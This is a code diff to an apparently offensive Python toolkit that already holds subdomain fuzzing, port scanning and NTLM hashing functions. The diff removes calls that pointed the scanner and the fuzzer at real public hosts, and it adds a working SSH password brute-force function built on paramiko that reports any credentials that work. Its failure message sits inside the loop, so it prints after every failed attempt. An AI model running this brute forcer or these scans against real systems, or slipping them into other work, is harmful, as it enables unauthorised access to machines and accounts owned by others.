@@ -2,6 +2,7 @@ import binascii
 from Crypto.Hash import MD4
 import socket
 import requests
+import paramiko
 
 
 def fuzz_domains(target, wordlist, https=False):
@@ -33,6 +34,15 @@ def ntlm_hash(password):
   return md4.hexdigest()
 
 
-scan_ports("8.8.8.8", [22, 80, 443, 3389])
-fuzz_domains("google.com", ["www", "mail", "ftp", "admin"], https=True)
-
+def ssh_brute_force(hostname, username, password_list):
+  for password in password_list:
+    try:
+      client = paramiko.SSHClient()
+      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+      client.connect(hostname, username=username, password=password)
+      print(f"[+] Success: {username}@{hostname} with password: {password}")
+      client.close()
+      return
+    except Exception:
+      pass
+    print(f"[-] Password not found")
